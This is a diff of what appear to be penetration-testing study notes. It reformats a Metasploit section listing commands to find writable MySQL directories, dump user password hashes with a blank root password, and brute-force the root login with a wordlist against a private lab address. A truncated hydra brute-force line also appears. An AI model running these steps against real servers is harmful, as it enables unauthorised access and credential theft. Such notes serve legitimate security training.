@@ -47,25 +47,25 @@ hydra -l root -P /usr/share/metasploit-framework/data/wordlists/unix_password.tx
 
 ## msfconsole
 ### MYSQL
-- use auxiliary/scanner/mysql/mysql_writable_dirs
-	- set dir_list /usr/share/metasploit-framework/data/wordlists/directory.txt
-	- setg rhosts 192.168.34.2
-		- setg : set globaly
-	- set verbose false
-	- advanced : advanced options
-	- set password "" : null password
-	- run
-- use auxiliary/scanner/mysql/mysql_hashdump
-	- set username root
-	- set password "" : doesn't show in options
-	- run
-	- gives user hashes
-- use auxiliary/scanner/mysql/mysql_login
-	- set rhost addr
-	- set pass_file /usr/share/metasploit-framework/data/wordlists/unix_password.txt
-	- set stop_on_success true
-	- set username root
-	- run
+1. use auxiliary/scanner/mysql/**mysql_writable_dirs**
+	1. set dir_list /usr/share/metasploit-framework/data/wordlists/directory.txt
+	2. setg rhosts 192.168.34.2
+	3. setg : set globaly
+	4. set verbose false
+	5. advanced : advanced options
+	6. set password "" : null password
+	7. run
+3. use auxiliary/scanner/mysql/**mysql_hashdump**
+	1. set username root
+	2. set password "" : doesn't show in options
+	3. run
+	4. gives user hashes
+5. use auxiliary/scanner/mysql/**mysql_login**
+	1. set rhost addr
+	2. set pass_file /usr/share/metasploit-framework/data/wordlists/unix_password.txt
+	3. set stop_on_success true
+	4. set username root
+	5. run
 #### Useful modules
 - auxiliary/scanner/mysql/mysql_version
 - auxiliary/scanner/mysql/mysql_login
